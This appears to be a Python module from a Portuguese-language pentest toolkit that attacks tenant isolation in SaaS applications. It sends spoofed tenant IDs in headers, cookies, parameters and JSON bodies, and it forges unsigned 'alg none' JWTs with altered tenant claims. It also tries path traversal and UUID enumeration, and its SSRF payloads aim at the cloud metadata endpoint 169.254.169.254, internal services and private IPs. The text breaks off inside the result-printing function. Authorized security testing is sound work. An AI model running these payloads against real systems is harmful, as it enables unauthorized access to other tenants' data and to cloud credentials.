#!/usr/bin/env python3
"""Modulo de testes de Seguranca Multi-Tenant.

Testa isolamento entre tenants em aplicações SaaS/multi-tenant:
  - Tenant ID Manipulation (header, cookie, param, JWT)
  - Subdomain Tenant Isolation (cookie scope, cross-subdomain)
  - Shared Resource Access (acesso a recursos de outros tenants)
  - Cross-Tenant SSRF (SSRF para infra interna de tenants)

Estrategia: manipula identificadores de tenant em requests e verifica
se a aplicacao retorna dados de outros tenants ou permite acesso indevido.
"""

from __future__ import annotations

import argparse
import json
import logging
import re
from collections.abc import Awaitable, Callable
from dataclasses import asdict, dataclass
from typing import Any

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    fetch,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.multitenant")

# ─── Banner ──────────────────────────────────────────────────────────────────

_BANNER_LINES: str = (
    "  __  __ _       _ _             _   _                \n"
    " |  \\/  (_)_ __ (_) | ___  _   _| |_| |__   ___ _ __ \n"
    " | |\\/| | | '_ \\| | |/ _ \\| | | | __| '_ \\ / _ \\ '__|\n"
    " | |  | | | | | | | | (_) | |_| | |_| | | |  __/ |   \n"
    " |_|  |_|_|_| |_|_|_|\\___/ \\__, |\\__|_| |_|\\___|_|   \n"
    "                             |___/                     "
)

# ─── Category Map ────────────────────────────────────────────────────────────

_CATEGORY_MAP: dict[str, list[str]] = {
    "tenant_id": [
        "header_x_tenant_id",
        "header_x_account_id",
        "cookie_tenant_id",
        "query_param_tenant",
        "json_body_tenant",
        "jwt_tenant_claim",
    ],
    "subdomain_isolation": [
        "cookie_domain_wildcard",
        "cross_subdomain_referer",
        "cross_subdomain_origin",
        "samesite_none_bypass",
    ],
    "shared_resource": [
        "path_traversal_tenant",
        "uuid_enumeration",
        "shared_api_endpoint",
        "storage_direct_access",
    ],
    "cross_tenant_ssrf": [
        "metadata_service",
        "internal_service_discovery",
        "tenant_internal_hostname",
        "internal_ip_range",
    ],
}

# ─── Tenant ID Payloads ─────────────────────────────────────────────────────

_TENANT_ID_HEADERS: list[tuple[str, str, str]] = [
    ("X-Tenant-ID", "OTHER_TENANT_999", "header_x_tenant_id"),
    ("X-Account-ID", "OTHER_TENANT_999", "header_x_account_id"),
    ("X-Organization-ID", "OTHER_TENANT_999", "header_x_org_id"),
    ("Tenant-ID", "OTHER_TENANT_999", "header_tenant_id"),
]

_TENANT_ID_PARAMS: list[tuple[str, str, str]] = [
    ("tenant_id", "OTHER_TENANT_999", "query_param_tenant"),
    ("tenant", "OTHER_TENANT_999", "query_param_tenant"),
    ("org_id", "OTHER_TENANT_999", "query_param_org"),
    ("account_id", "OTHER_TENANT_999", "query_param_account"),
]

_TENANT_ID_COOKIES: list[tuple[str, str, str]] = [
    ("tenant_id", "OTHER_TENANT_999", "cookie_tenant_id"),
    ("tenant", "OTHER_TENANT_999", "cookie_tenant"),
    ("org_id", "OTHER_TENANT_999", "cookie_org_id"),
]

_TENANT_ID_JSON_BODY: list[tuple[str, str, str]] = [
    ("tenant_id", "OTHER_TENANT_999", "json_body_tenant"),
    ("tenant", "OTHER_TENANT_999", "json_body_tenant"),
    ("org_id", "OTHER_TENANT_999", "json_body_org"),
]

# ─── JWT Tenant Claim Payloads ──────────────────────────────────────────────

_JWT_TENANT_CLAIMS: list[tuple[str, str, str]] = [
    ("tenant", "OTHER_TENANT_999", "jwt_tenant_claim"),
    ("org", "OTHER_TENANT_999", "jwt_org_claim"),
    ("account", "OTHER_TENANT_999", "jwt_account_claim"),
    ("sub_tenant", "OTHER_TENANT_999", "jwt_sub_tenant_claim"),
]

# ─── Subdomain Isolation Payloads ───────────────────────────────────────────

_SUBDOMAIN_INDICATORS: list[str] = [
    "tenant",
    "account",
    "organization",
    "forbidden",
    "unauthorized",
    "access denied",
    "not found",
    "invalid tenant",
]

# ─── Shared Resource Payloads ───────────────────────────────────────────────

_SHARED_RESOURCE_PATHS: list[tuple[str, str, str]] = [
    ("/files/", "path_traversal_tenant", "storage_direct_access"),
    ("/uploads/", "path_traversal_tenant", "storage_direct_access"),
    ("/attachments/", "path_traversal_tenant", "storage_direct_access"),
    ("/api/v1/shared/", "shared_api_endpoint", "shared_api_endpoint"),
    ("/api/v1/public/", "shared_api_endpoint", "shared_api_endpoint"),
    ("/api/v1/cross-tenant/", "shared_api_endpoint", "shared_api_endpoint"),
]

_TENANT_PATH_TRAVERSALS: list[tuple[str, str]] = [
    ("/../tenant-OTHER/files/", "path_traversal_tenant"),
    ("/../tenant-OTHER/uploads/", "path_traversal_tenant"),
    ("/../OTHER_TENANT_999/data/", "path_traversal_tenant"),
    ("/..%2ftenant-OTHER%2ffiles/", "path_traversal_tenant"),
]

_FAKE_UUIDS: list[str] = [
    "550e8400-e29b-41d4-a716-446655440000",
    "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
    "f47ac10b-58cc-4372-a567-0e02b2c3d479",
    "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
]

# ─── Cross-Tenant SSRF Payloads ─────────────────────────────────────────────

_SSRF_METADATA_IPS: list[str] = [
    "169.254.169.254",
    "metadata.google.internal",
    "169.254.169.254/latest/meta-data/",
    "instance-data.ec2.internal",
]

_SSRF_INTERNAL_SERVICES: list[str] = [
    "consul.service.internal",
    "etcd.service.internal",
    "kubernetes.default.svc.cluster.local",
    "redis.service.internal",
    "rabbitmq.service.internal",
    "postgres.service.internal",
]

_SSRF_TENANT_HOSTNAMES: list[str] = [
    "tenant-OTHER.internal.example.com",
    "app-OTHER.internal.example.com",
    "api-OTHER.internal.example.com",
    "admin-OTHER.internal.example.com",
]

_SSRF_INTERNAL_IPS: list[str] = [
    "10.0.0.1",
    "172.16.0.1",
    "192.168.1.1",
    "10.10.10.10",
    "172.16.0.100",
]

# ─── Indicators ──────────────────────────────────────────────────────────────

_VULN_INDICATORS: list[str] = [
    "tenant",
    "account",
    "organization",
    "user_id",
    "email",
    "name",
    "balance",
    "amount",
    "total",
    "payment",
    "invoice",
    "order",
    "ssrf",
    "metadata",
    "ami-id",
    "instance-id",
]

_ERROR_INDICATORS: list[str] = [
    "forbidden",
    "unauthorized",
    "access denied",
    "not found",
    "invalid tenant",
    "cross-tenant",
    "isolation",
]

# ─── Dataclasses ─────────────────────────────────────────────────────────────


@dataclass(frozen=True, slots=True)
class TenantAttempt:
    """Tentativa individual de teste multi-tenant."""

    technique: str
    category: str
    tenant_id: str
    endpoint: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class TenantResult:
    """Resultado consolidado do scan multi-tenant."""

    target: str
    tls: bool
    baseline_status: int
    baseline_size: int
    current_tenant: str
    attempts: list[TenantAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


# ─── Category Testers ────────────────────────────────────────────────────────

_CATEGORY_TESTERS: dict[str, Callable[..., Awaitable[list[TenantAttempt]]]] = {}


def _register_category(name: str) -> Callable[..., Any]:
    """Decorator para registrar tester de categoria."""

    def decorator(
        fn: Callable[..., Awaitable[list[TenantAttempt]]],
    ) -> Callable[..., Awaitable[list[TenantAttempt]]]:
        _CATEGORY_TESTERS[name] = fn
        return fn

    return decorator


# ─── Helpers ─────────────────────────────────────────────────────────────────


def _check_vulnerable(resp_body: bytes, indicators: list[str]) -> tuple[bool, str]:
    """Verifica se resposta contém indicadores de vulnerabilidade."""
    body_lower = resp_body.decode("utf-8", errors="replace").lower()
    for ind in indicators:
        if ind.lower() in body_lower:
            return True, f"indicator '{ind}' found in response"
    return False, ""


def _make_attempt(
    *,
    technique: str,
    category: str,
    tenant_id: str,
    endpoint: str,
    payload: str,
    b_status: int,
    b_size: int,
    t_status: int,
    t_size: int,
    vulnerable: bool,
    details: str = "",
    error: str = "",
) -> TenantAttempt:
    """Cria TenantAttempt com campos derivados preenchidos."""
    return TenantAttempt(
        exploit="tenant_id_switch_payload",
        tool="curl",
        technique=technique,
        category=category,
        tenant_id=tenant_id,
        endpoint=endpoint,
        payload=payload,
        status_baseline=b_status,
        status_test=t_status,
        size_baseline=b_size,
        size_test=t_size,
        status_changed=t_status != b_status,
        size_changed=abs(t_size - b_size) > 50,
        vulnerable=vulnerable,
        details=details,
        error=error,
    )


def _parse_jwt_payload(token: str) -> dict[str, Any] | None:
    """Decodifica payload de JWT (sem verificação de assinatura)."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        import base64

        payload_b64 = parts[1]
        # Adiciona padding
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding
        decoded = base64.urlsafe_b64decode(payload_b64)
        return json.loads(decoded)
    except Exception:
        return None


def _encode_jwt_payload(payload: dict[str, Any]) -> str:
    """Codifica payload para JWT (sem assinatura)."""
    import base64

    payload_json = json.dumps(payload, separators=(",", ":"))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b"=").decode()
    return f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{payload_b64}."


def _detect_current_tenant(body: bytes) -> str:
    """Tenta detectar o tenant ID atual a partir da resposta."""
    body_str = body.decode("utf-8", errors="replace")

    # Procura por padrões comuns de tenant ID
    patterns = [
        r'"tenant[_-]?id"\s*:\s*"([^"]+)"',
        r'"tenant"\s*:\s*"([^"]+)"',
        r'"org[_-]?id"\s*:\s*"([^"]+)"',
        r'"account[_-]?id"\s*:\s*"([^"]+)"',
        r'"organization"\s*:\s*"([^"]+)"',
    ]

    for pattern in patterns:
        match = re.search(pattern, body_str, re.IGNORECASE)
        if match:
            return match.group(1)

    return "unknown"


def _extract_cookie_domain(headers: dict[str, str]) -> str | None:
    """Extrai domínio do Set-Cookie header."""
    for key, val in headers.items():
        if key.lower() == "set-cookie":
            match = re.search(r"Domain=([^;]+)", val, re.IGNORECASE)
            if match:
                return match.group(1).strip()
    return None


def _extract_cookie_samesite(headers: dict[str, str]) -> str | None:
    """Extrai SameSite do Set-Cookie header."""
    for key, val in headers.items():
        if key.lower() == "set-cookie":
            match = re.search(r"SameSite=([^;]+)", val, re.IGNORECASE)
            if match:
                return match.group(1).strip()
    return None


# ─── Category: Tenant ID Manipulation ───────────────────────────────────────


@_register_category("tenant_id")
async def _test_tenant_id(
    client: httpx.AsyncClient,
    target: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[TenantAttempt]:
    """Testa manipulação de Tenant ID via headers, cookies, params e body."""
    results: list[TenantAttempt] = []
    other_tenant = "OTHER_TENANT_999"

    # 1. Headers
    for header_name, header_val, technique in _TENANT_ID_HEADERS:
        try:
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                target,
                timeout=timeout,
                headers={header_name: header_val},
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=f"{header_name}: {header_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=f"{header_name}: {header_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 2. Query params
    for param_name, param_val, technique in _TENANT_ID_PARAMS:
        try:
            sep = "&" if "?" in target else "?"
            test_url = f"{target}{sep}{param_name}={param_val}"
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                test_url,
                timeout=timeout,
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=test_url,
                    payload=f"{param_name}={param_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=f"{param_name}={param_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 3. Cookies
    for cookie_name, cookie_val, technique in _TENANT_ID_COOKIES:
        try:
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                target,
                timeout=timeout,
                headers={"Cookie": f"{cookie_name}={cookie_val}"},
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=f"Cookie: {cookie_name}={cookie_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=f"Cookie: {cookie_name}={cookie_val}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 4. JSON body
    for body_key, body_val, technique in _TENANT_ID_JSON_BODY:
        try:
            body_dict = {body_key: body_val}
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                target,
                timeout=timeout,
                method="post",
                content=json.dumps(body_dict).encode(),
                headers={"Content-Type": "application/json"},
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=json.dumps(body_dict),
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="tenant_id",
                    tenant_id=other_tenant,
                    endpoint=target,
                    payload=json.dumps({body_key: body_val}),
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 5. JWT tenant claim (se Authorization Bearer existe)
    try:
        _b_status, _b_headers, _b_body, _b_raw = await fetch(
            client,
            target,
            timeout=timeout,
        )
        auth_header = _b_headers.get("authorization", "")
        if auth_header.lower().startswith("bearer "):
            original_token = auth_header[7:]
            jwt_payload = _parse_jwt_payload(original_token)
            if jwt_payload is not None:
                for claim_name, claim_val, technique in _JWT_TENANT_CLAIMS:
                    modified_payload = {**jwt_payload, claim_name: claim_val}
                    new_token = _encode_jwt_payload(modified_payload)
                    try:
                        t_status, _t_headers, t_body, _t_raw = await fetch(
                            client,
                            target,
                            timeout=timeout,
                            headers={"Authorization": f"Bearer {new_token}"},
                        )
                        vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
                        results.append(
                            _make_attempt(
                                technique=technique,
                                category="tenant_id",
                                tenant_id=other_tenant,
                                endpoint=target,
                                payload=f"JWT claim {claim_name}={claim_val}",
                                b_status=b_status,
                                b_size=b_size,
                                t_status=t_status,
                                t_size=len(t_body),
                                vulnerable=vuln,
                                details=details,
                            )
                        )
                    except Exception as e:
                        results.append(
                            _make_attempt(
                                technique=technique,
                                category="tenant_id",
                                tenant_id=other_tenant,
                                endpoint=target,
                                payload=f"JWT claim {claim_name}={claim_val}",
                                b_status=b_status,
                                b_size=b_size,
                                t_status=0,
                                t_size=0,
                                vulnerable=False,
                                error=str(e)[:100],
                            )
                        )
    except Exception:
        pass

    return results


# ─── Category: Subdomain Isolation ──────────────────────────────────────────


@_register_category("subdomain_isolation")
async def _test_subdomain_isolation(
    client: httpx.AsyncClient,
    target: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[TenantAttempt]:
    """Testa isolamento entre tenants via subdomínios."""
    results: list[TenantAttempt] = []

    # 1. Verifica cookie Domain wildcard
    try:
        t_status, t_headers, t_body, _t_raw = await fetch(
            client,
            target,
            timeout=timeout,
        )
        cookie_domain = _extract_cookie_domain(dict(t_headers))
        if cookie_domain:
            is_wildcard = cookie_domain.startswith(".")
            vuln = is_wildcard
            results.append(
                _make_attempt(
                    technique="cookie_domain_wildcard",
                    category="subdomain_isolation",
                    tenant_id="current",
                    endpoint=target,
                    payload=f"Set-Cookie Domain={cookie_domain}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=f"Cookie domain '{cookie_domain}' may leak to subdomains"
                    if vuln
                    else "",
                )
            )
        else:
            results.append(
                _make_attempt(
                    technique="cookie_domain_wildcard",
                    category="subdomain_isolation",
                    tenant_id="current",
                    endpoint=target,
                    payload="no Set-Cookie",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=False,
                    details="No Set-Cookie header found",
                )
            )
    except Exception as e:
        results.append(
            _make_attempt(
                technique="cookie_domain_wildcard",
                category="subdomain_isolation",
                tenant_id="current",
                endpoint=target,
                payload="",
                b_status=b_status,
                b_size=b_size,
                t_status=0,
                t_size=0,
                vulnerable=False,
                error=str(e)[:100],
            )
        )

    # 2. Verifica SameSite=None
    try:
        t_status, t_headers, t_body, _t_raw = await fetch(
            client,
            target,
            timeout=timeout,
        )
        samesite = _extract_cookie_samesite(dict(t_headers))
        if samesite and samesite.lower() == "none":
            results.append(
                _make_attempt(
                    technique="samesite_none_bypass",
                    category="subdomain_isolation",
                    tenant_id="current",
                    endpoint=target,
                    payload=f"SameSite={samesite}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=True,
                    details="SameSite=None allows cross-origin cookie sending",
                )
            )
        else:
            results.append(
                _make_attempt(
                    technique="samesite_none_bypass",
                    category="subdomain_isolation",
                    tenant_id="current",
                    endpoint=target,
                    payload=f"SameSite={samesite or 'not set'}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=False,
                )
            )
    except Exception as e:
        results.append(
            _make_attempt(
                technique="samesite_none_bypass",
                category="subdomain_isolation",
                tenant_id="current",
                endpoint=target,
                payload="",
                b_status=b_status,
                b_size=b_size,
                t_status=0,
                t_size=0,
                vulnerable=False,
                error=str(e)[:100],
            )
        )

    # 3. Cross-subdomain Referer
    parsed = httpx.URL(target)
    host = parsed.host or ""
    parts = host.split(".")
    if len(parts) >= 2:
        base_domain = ".".join(parts[-2:])
        test_subdomains = [
            f"app-OTHER.{base_domain}",
            f"admin-OTHER.{base_domain}",
            f"api-OTHER.{base_domain}",
        ]
        for subdomain in test_subdomains:
            try:
                referer = f"https://{subdomain}/dashboard"
                t_status, _t_headers, t_body, _t_raw = await fetch(
                    client,
                    target,
                    timeout=timeout,
                    headers={"Referer": referer},
                )
                vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
                results.append(
                    _make_attempt(
                        technique="cross_subdomain_referer",
                        category="subdomain_isolation",
                        tenant_id="OTHER",
                        endpoint=target,
                        payload=f"Referer: {referer}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=t_status,
                        t_size=len(t_body),
                        vulnerable=vuln,
                        details=details,
                    )
                )
            except Exception as e:
                results.append(
                    _make_attempt(
                        technique="cross_subdomain_referer",
                        category="subdomain_isolation",
                        tenant_id="OTHER",
                        endpoint=target,
                        payload=f"Referer: https://{subdomain}/",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=0,
                        t_size=0,
                        vulnerable=False,
                        error=str(e)[:100],
                    )
                )

    # 4. Cross-subdomain Origin
    if len(parts) >= 2:
        base_domain = ".".join(parts[-2:])
        origin = f"https://app-OTHER.{base_domain}"
        try:
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                target,
                timeout=timeout,
                headers={"Origin": origin},
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique="cross_subdomain_origin",
                    category="subdomain_isolation",
                    tenant_id="OTHER",
                    endpoint=target,
                    payload=f"Origin: {origin}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique="cross_subdomain_origin",
                    category="subdomain_isolation",
                    tenant_id="OTHER",
                    endpoint=target,
                    payload=f"Origin: {origin}",
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category: Shared Resource Access ───────────────────────────────────────


@_register_category("shared_resource")
async def _test_shared_resource(
    client: httpx.AsyncClient,
    target: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[TenantAttempt]:
    """Testa acesso a recursos compartilhados entre tenants."""
    results: list[TenantAttempt] = []

    # 1. Path traversal entre tenants
    for path, technique in _TENANT_PATH_TRAVERSALS:
        try:
            parsed = httpx.URL(target)
            base = f"{parsed.scheme}://{parsed.host}"
            if parsed.port:
                base += f":{parsed.port}"
            test_url = f"{base}{path}"
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                test_url,
                timeout=timeout,
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="shared_resource",
                    tenant_id="OTHER_TENANT_999",
                    endpoint=test_url,
                    payload=path,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="shared_resource",
                    tenant_id="OTHER_TENANT_999",
                    endpoint=target,
                    payload=path,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 2. UUID enumeration
    for uuid in _FAKE_UUIDS:
        try:
            parsed = httpx.URL(target)
            base = f"{parsed.scheme}://{parsed.host}"
            if parsed.port:
                base += f":{parsed.port}"
            test_url = f"{base}/api/v1/files/{uuid}"
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                test_url,
                timeout=timeout,
            )
            # UUIDs que retornam 200 com conteudo distinto do baseline sao suspeitos
            vuln = bool(
                t_status == 200
                and t_body.strip()
                and b_size > 0
                and abs(len(t_body) - b_size) > 50
            )
            details = (
                f"UUID returned HTTP {t_status} (size {len(t_body)} vs baseline {b_size})"
                if vuln
                else ""
            )
            results.append(
                _make_attempt(
                    technique="uuid_enumeration",
                    category="shared_resource",
                    tenant_id="OTHER_TENANT_999",
                    endpoint=test_url,
                    payload=uuid,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique="uuid_enumeration",
                    category="shared_resource",
                    tenant_id="OTHER_TENANT_999",
                    endpoint=target,
                    payload=uuid,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    # 3. Shared API endpoints
    for path, technique, _cat in _SHARED_RESOURCE_PATHS:
        try:
            parsed = httpx.URL(target)
            base = f"{parsed.scheme}://{parsed.host}"
            if parsed.port:
                base += f":{parsed.port}"
            test_url = f"{base}{path}"
            t_status, _t_headers, t_body, _t_raw = await fetch(
                client,
                test_url,
                timeout=timeout,
            )
            vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
            results.append(
                _make_attempt(
                    technique=technique,
                    category="shared_resource",
                    tenant_id="shared",
                    endpoint=test_url,
                    payload=path,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=t_status,
                    t_size=len(t_body),
                    vulnerable=vuln,
                    details=details,
                )
            )
        except Exception as e:
            results.append(
                _make_attempt(
                    technique=technique,
                    category="shared_resource",
                    tenant_id="shared",
                    endpoint=target,
                    payload=path,
                    b_status=b_status,
                    b_size=b_size,
                    t_status=0,
                    t_size=0,
                    vulnerable=False,
                    error=str(e)[:100],
                )
            )

    return results


# ─── Category: Cross-Tenant SSRF ────────────────────────────────────────────


@_register_category("cross_tenant_ssrf")
async def _test_cross_tenant_ssrf(
    client: httpx.AsyncClient,
    target: str,
    timeout: float,
    b_status: int,
    b_size: int,
) -> list[TenantAttempt]:
    """Testa SSRF que atinge infra interna de outros tenants."""
    results: list[TenantAttempt] = []

    # Parâmetros comuns que podem conter URLs
    ssrf_params = [
        "url",
        "redirect",
        "callback",
        "webhook",
        "fetch",
        "load",
        "src",
        "href",
        "link",
        "target",
        "next",
        "return_to",
    ]

    # 1. Metadata service
    for ip in _SSRF_METADATA_IPS:
        for param in ssrf_params[:4]:
            try:
                sep = "&" if "?" in target else "?"
                test_url = f"{target}{sep}{param}=http://{ip}/latest/meta-data/"
                t_status, _t_headers, t_body, _t_raw = await fetch(
                    client,
                    test_url,
                    timeout=timeout,
                )
                body_str = t_body.decode("utf-8", errors="replace").lower()
                vuln = any(
                    ind in body_str for ind in ["ami-id", "instance-id", "metadata"]
                )
                details = "Metadata service accessible" if vuln else ""
                results.append(
                    _make_attempt(
                        technique="metadata_service",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=test_url,
                        payload=f"{param}=http://{ip}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=t_status,
                        t_size=len(t_body),
                        vulnerable=vuln,
                        details=details,
                    )
                )
            except Exception as e:
                results.append(
                    _make_attempt(
                        technique="metadata_service",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=target,
                        payload=f"{param}=http://{ip}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=0,
                        t_size=0,
                        vulnerable=False,
                        error=str(e)[:100],
                    )
                )

    # 2. Internal service discovery
    for service in _SSRF_INTERNAL_SERVICES:
        for param in ssrf_params[:3]:
            try:
                sep = "&" if "?" in target else "?"
                test_url = f"{target}{sep}{param}=http://{service}/"
                t_status, _t_headers, t_body, _t_raw = await fetch(
                    client,
                    test_url,
                    timeout=timeout,
                )
                vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
                results.append(
                    _make_attempt(
                        technique="internal_service_discovery",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=test_url,
                        payload=f"{param}=http://{service}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=t_status,
                        t_size=len(t_body),
                        vulnerable=vuln,
                        details=details,
                    )
                )
            except Exception as e:
                results.append(
                    _make_attempt(
                        technique="internal_service_discovery",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=target,
                        payload=f"{param}=http://{service}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=0,
                        t_size=0,
                        vulnerable=False,
                        error=str(e)[:100],
                    )
                )

    # 3. Tenant internal hostnames
    for hostname in _SSRF_TENANT_HOSTNAMES:
        for param in ssrf_params[:3]:
            try:
                sep = "&" if "?" in target else "?"
                test_url = f"{target}{sep}{param}=http://{hostname}/"
                t_status, _t_headers, t_body, _t_raw = await fetch(
                    client,
                    test_url,
                    timeout=timeout,
                )
                vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
                results.append(
                    _make_attempt(
                        technique="tenant_internal_hostname",
                        category="cross_tenant_ssrf",
                        tenant_id="OTHER",
                        endpoint=test_url,
                        payload=f"{param}=http://{hostname}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=t_status,
                        t_size=len(t_body),
                        vulnerable=vuln,
                        details=details,
                    )
                )
            except Exception as e:
                results.append(
                    _make_attempt(
                        technique="tenant_internal_hostname",
                        category="cross_tenant_ssrf",
                        tenant_id="OTHER",
                        endpoint=target,
                        payload=f"{param}=http://{hostname}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=0,
                        t_size=0,
                        vulnerable=False,
                        error=str(e)[:100],
                    )
                )

    # 4. Internal IP ranges
    for ip in _SSRF_INTERNAL_IPS:
        for param in ssrf_params[:3]:
            try:
                sep = "&" if "?" in target else "?"
                test_url = f"{target}{sep}{param}=http://{ip}/"
                t_status, _t_headers, t_body, _t_raw = await fetch(
                    client,
                    test_url,
                    timeout=timeout,
                )
                vuln, details = _check_vulnerable(t_body, _VULN_INDICATORS)
                results.append(
                    _make_attempt(
                        technique="internal_ip_range",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=test_url,
                        payload=f"{param}=http://{ip}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=t_status,
                        t_size=len(t_body),
                        vulnerable=vuln,
                        details=details,
                    )
                )
            except Exception as e:
                results.append(
                    _make_attempt(
                        technique="internal_ip_range",
                        category="cross_tenant_ssrf",
                        tenant_id="current",
                        endpoint=target,
                        payload=f"{param}=http://{ip}",
                        b_status=b_status,
                        b_size=b_size,
                        t_status=0,
                        t_size=0,
                        vulnerable=False,
                        error=str(e)[:100],
                    )
                )

    return results


# ─── Print Results ───────────────────────────────────────────────────────────


def print_results(result: TenantResult) -> None:
    """Imprime resultados formatados no terminal."""
    print()
    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "Multi-Tenant Security Test")
    print(color("[*]", Cyber.CYAN), f"Target: {result.target}")
    print(color("[*]", Cyber.CYAN), f"TLS: {result.tls}")
    print(
        color("[*]", Cyber.CYAN),
        f"Baseline: HTTP {result.baseline_status} ({result.baseline_size} bytes)",
    )
